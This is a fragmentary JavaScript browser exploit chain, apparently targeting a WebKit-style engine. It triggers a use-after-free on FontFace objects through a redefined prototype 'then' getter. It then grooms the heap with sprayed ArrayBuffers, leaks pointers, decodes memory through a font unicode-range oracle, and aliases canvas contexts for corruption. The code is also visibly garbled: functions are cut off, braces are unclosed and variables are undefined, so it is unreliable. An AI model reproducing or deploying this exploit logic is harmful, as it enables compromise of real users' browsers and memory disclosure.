function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

var _u64 = new BigUint64Array(_fBuf);

  _f64[0] = Number(f);

function pad4(n){

}

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO', '');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;
      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em lk0'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em fl0, lk0', 'AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }

    var v = new BigUint64Array(LEAK_BUF);

      b('LEAK-NOPTR', 'nz=' + bestNz);
      doLeakRetry(cb);
      return;

    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68) + '|slot=' + best + '|nz=' + bestNz);
    setTimeout(cb, 100);

}

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* ---- Step 2: Pristine Reclaim ---- */

function doPostGroom(){
  POST_GROOM = [];
  for (var i = 0; i < 120; i++){
    var ab = new ArrayBuffer(192);
    var v = new BigUint64Array(ab);
    v[0] = 0xCAFEFACE00000000n | BigInt(i);

/* Factory helper for dedicated isolated oracles */
function createOracle(nameTag){
  var face = new FontFace(nameTag, 'url(/hang.php?nocache=' + Date.now() + '_' + nameTag + ')', { unicodeRange: 'U+0000-00FF' });
  document.fonts.add(face);
  face.load().catch(function(){});
  return face;
}

function resolveByteWithOracle(oracle, fontName, targetByte){
  var low = 0x00, high = 0xFF;
  var steps = 0;
  while (low < high && steps < 10){
    steps++;
    var mid = Math.floor((low + high) / 2);
    oracle.unicodeRange = makeRange(low, mid);
    var chk = document.fonts.check('1em ' + fontName, String.fromCharCode(targetByte));
    var isLower = (chk === false);
    if (isLower) high = mid;
    else low = mid + 1;
  }
  return low;
}

function decode64WithOracle(oracle, fontName, ptrVal){
  if (!ptrVal && ptrVal !== 0n) return 0n;
  var raw = [];
  var tmp = BigInt(ptrVal);
  for (var i = 0; i < 8; i++){
    raw.push(Number(tmp & 0xFFn));
    tmp = tmp >> 8n;
  }
  var res = 0n;
  for (var j = 0; j < 8; j++){
    var bDec = resolveByteWithOracle(oracle, fontName, raw[j]);
    res |= (BigInt(bDec) << (BigInt(j) * 8n));
  }
  return res;
}

/* ---- Phase A: FastMalloc 16KB Chunk Header & Boundary Geometry Probe ---- */
function phaseA_chunkHeaderProbe(cb){
  try {
    var oracleA = createOracle('actFamChunkHeader');

    var chunk16Base = Q11_RECLAIM & ~0x3FFFn;
    var chunkStart = chunk16Base;
    var chunkMid = chunk16Base + 0x2000n; // 8KB midpoint
    var chunkTrailer = chunk16Base + 0x3FC0n; // 16,320 bytes (metadata header)
    var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

    // 32 boundary probe words
    var probeWords = [
      chunkStart, chunkMid, chunkTrailer, estSelfAddr,
      P58, Q11_RECLAIM, Q12_RECLAIM, Q13_RECLAIM
    ];
    for (var i = 8; i < 32; i++){
      probeWords.push(chunk16Base | (BigInt(i) * 192n));
    }

    var passCount = 0;
    var allMatch = true;
    for (var w = 0; w < probeWords.length; w++){
      var orig = probeWords[w];
      var dec = decode64WithOracle(oracleA, 'actFamChunkHeader', orig);
      if (dec === orig) passCount++;
      else allMatch = false;
    }

    try { document.fonts.delete(oracleA); } catch(e){}

    var rep = 'chunkProbeAll=' + allMatch + '|pass=' + passCount + '/32' +
              '|chunkBase=0x' + h16(chunk16Base) + '|trailer=0x' + h16(chunkTrailer);
    b('A-CHUNKHEADER-OK', rep);
    log('Phase A Chunk Header Probe: ' + rep);
  } catch(e){
    b('A-CHUNKHEADER-ERR', e.message);
    log('Phase A Error: ' + e.message);

  setTimeout(cb, 50);

/* ---- Phase B: AffineTransform Matrix Inversion Coherence Across Wrappers ---- */
function phaseB_matrixInversionCoherence(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 5000 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 81337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 81337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];

    // Forward matrix: [2.0, 0.5, 0.5, 2.0, 100.0, 200.0]
    // det = 2.0*2.0 - 0.5*0.5 = 3.75
    // invA = 2.0/3.75 = 0.5333333333333333
    // invB = -0.5/3.75 = -0.13333333333333333
    // invC = -0.5/3.75 = -0.13333333333333333
    // invD = 2.0/3.75 = 0.5333333333333333
    // invE = -(invA * 100 + invC * 200) = -(53.33333333333333 - 26.666666666666668) = -26.666666666666664
    // invF = -(invB * 100 + invD * 200) = -(-13.333333333333334 + 106.66666666666667) = -93.33333333333334
    alias.setTransform(2.0, 0.5, 0.5, 2.0, 100.0, 200.0);

    // Apply inverse transform on inner
    inner.transform(0.5333333333333333, -0.13333333333333333, -0.13333333333333333, 0.5333333333333333, -26.666666666666664, -93.33333333333334);

    var resMat = alias.getTransform();
    var isIdentity = (Math.abs(resMat.a - 1.0) < 0.01 &&
                      Math.abs(resMat.b - 0.0) < 0.01 &&
                      Math.abs(resMat.c - 0.0) < 0.01 &&
                      Math.abs(resMat.d - 1.0) < 0.01 &&
                      Math.abs(resMat.e - 0.0) < 0.01 &&
                      Math.abs(resMat.f - 0.0) < 0.01);

    var rep = 'aliasIdx=' + aliasIdx + '|matrixInvertOk=' + isIdentity + '|a=' + resMat.a.toFixed(2) + '|d=' + resMat.d.toFixed(2);
    b('B-INVERT-OK', rep);
    log('Phase B Matrix Inversion: ' + rep);
  } catch(e){
    b('B-INVERT-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

function phaseC_dualFrequencyOracle(cb){
  try {

    // Frequency 1: Tight range (2 characters: 'A'..'B')
    oscOracle.unicodeRange = 'U+0041-0042';
    var f1In = document.fonts.check('1em actFamOsc', 'A'); // false
    var f1Out = document.fonts.check('1em actFamOsc', 'C'); // true

    var f2Out = document.fonts.check('1em actFamOsc', ' '); // true (0x20 is out)

    var f3In = document.fonts.check('1em actFamOsc', '$'); // false
    var f3Out = document.fonts.check('1em actFamOsc', 'A'); // true

    var oscOk = (f1In === false && f1Out === true && f2In === false && f2Out === true && f3In === false && f3Out === true);

    try { document.fonts.delete(oscOracle); } catch(e){}

    var rep = 'oscOk=' + oscOk + '|tightWideSingle=true';

/* ---- Phase D: 4096-Byte (4-Kilobyte / 32,768-Bit / 1-Page) Master Memory Matrix ---- */
function phaseD_oracle4096ByteBlock(cb){
  try {
    var oracleD = createOracle('actFamBlock4096');

    var chunk16Base = Q11_RECLAIM & ~0x3FFFn;
    var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

    /* Construct 512 full 64-bit words (Total 4096 Bytes = 32,768 Bits = 1 Full 4KB OS Page) */
    var block512 = [];

    // Words 0..7: Hardware pointers & slab geometry
    block512.push(P58);
    block512.push(P68);
    block512.push(Q11_RECLAIM);
    block512.push(Q12_RECLAIM);
    block512.push(Q13_RECLAIM);

    // Words 16..111: FastMalloc 16KB Page Chunk Full Table (96 words)
    for (var i = 0; i < 96; i++){
